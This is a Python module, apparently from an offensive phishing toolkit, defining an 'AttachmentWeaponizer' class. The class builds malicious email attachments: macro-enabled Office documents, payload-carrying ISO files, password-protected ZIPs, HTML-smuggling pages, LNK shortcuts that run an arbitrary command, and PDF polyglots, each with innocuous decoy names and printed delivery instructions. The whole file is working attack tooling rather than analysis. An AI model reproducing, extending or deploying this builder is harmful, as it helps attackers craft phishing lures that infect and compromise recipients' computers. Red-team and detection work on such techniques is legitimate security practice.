"""
Main attachment weaponizer orchestrator
"""
import os
from typing import List, Optional
from .attachment import Attachment, AttachmentType
from ..creators import (
    OfficeCreator,
    ArchiveCreator,
    HTMLCreator,
    LNKCreator,
    PolyglotCreator
)
from ..config.settings import Settings

class AttachmentWeaponizer:
    """Main orchestrator for creating weaponized attachments"""
    
    def __init__(self, output_dir: str = None):
        """
        Initialize weaponizer
        
        Args:
            output_dir: Output directory for attachments
        """
        self.output_dir = output_dir or Settings.DEFAULT_OUTPUT_DIR
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Initialize creators
        self.office_creator = OfficeCreator(self.output_dir)
        self.archive_creator = ArchiveCreator(self.output_dir)
        self.html_creator = HTMLCreator(self.output_dir)
        self.lnk_creator = LNKCreator(self.output_dir)
        self.polyglot_creator = PolyglotCreator(self.output_dir)
        
        self.created_attachments: List[Attachment] = []
    
    def create_macro_doc(self, macro_code_path: str, 
                        output_name: str = "document.docm") -> Attachment:
        """
        Create Word document with macro
        
        Args:
            macro_code_path: Path to macro VBA code
            output_name: Output filename
            
        Returns:
            Attachment object
        """
        attachment = self.office_creator.create_macro_doc(
            macro_code_path, 
            output_name
        )
        self.created_attachments.append(attachment)
        return attachment
    
    def create_macro_excel(self, macro_code_path: str,
                          output_name: str = "spreadsheet.xlsm") -> Attachment:
        """
        Create Excel spreadsheet with macro
        
        Args:
            macro_code_path: Path to macro VBA code
            output_name: Output filename
            
        Returns:
            Attachment object
        """
        attachment = self.office_creator.create_macro_excel(
            macro_code_path,
            output_name
        )
        self.created_attachments.append(attachment)
        return attachment
    
    def create_iso(self, payload_path: str,
                  output_name: str = "document.iso") -> Attachment:
        """
        Create ISO file containing payload
        
        Args:
            payload_path: Path to payload file
            output_name: Output filename
            
        Returns:
            Attachment object
        """
        attachment = self.archive_creator.create_iso(
            payload_path,
            output_name
        )
        self.created_attachments.append(attachment)
        return attachment
    
    def create_password_zip(self, file_path: str,
                           password: Optional[str] = None,
                           output_name: str = "document.zip") -> Attachment:
        """
        Create password-protected ZIP
        
        Args:
            file_path: Path to file to archive
            password: ZIP password (generated if not provided)
            output_name: Output filename
            
        Returns:
            Attachment object
        """
        attachment = self.archive_creator.create_password_zip(
            file_path,
            password,
            output_name
        )
        self.created_attachments.append(attachment)
        return attachment
    
    def create_html_smuggling(self, payload_url: str,
                             output_name: str = "document.html") -> Attachment:
        """
        Create HTML file with smuggled payload
        
        Args:
            payload_url: URL of payload to smuggle
            output_name: Output filename
            
        Returns:
            Attachment object
        """
        attachment = self.html_creator.create_smuggling_html(
            payload_url,
            output_name
        )
        self.created_attachments.append(attachment)
        return attachment
    
    def create_lnk(self, command: str,
                  output_name: str = "document.lnk") -> Attachment:
        """
        Create malicious LNK file
        
        Args:
            command: Command to execute
            output_name: Output filename
            
        Returns:
            Attachment object
        """
        attachment = self.lnk_creator.create_lnk(
            command,
            output_name
        )
        self.created_attachments.append(attachment)
        return attachment
    
    def create_polyglot(self, payload_path: str,
                       output_name: str = "document.pdf") -> Attachment:
        """
        Create polyglot file
        
        Args:
            payload_path: Path to payload
            output_name: Output filename
            
        Returns:
            Attachment object
        """
        attachment = self.polyglot_creator.create_polyglot(
            payload_path,
            output_name
        )
        self.created_attachments.append(attachment)
        return attachment
    
    def list_created(self) -> List[Attachment]:
        """Get list of all created attachments"""
        return self.created_attachments
    
    def print_summary(self):
        """Print summary of created attachments"""
        if not self.created_attachments:
            print("[!] No attachments created yet")
            return
        
        print(f"\n[*] Created {len(self.created_attachments)} attachment(s):")
        print("=" * 80)
        
        for i, attachment in enumerate(self.created_attachments, 1):
            print(f"\n{i}. {attachment.name}")
            print(f"   Type: {attachment.attachment_type.value}")
            print(f"   Path: {attachment.output_path}")
            print(f"   Instructions: {attachment.get_delivery_instructions()}")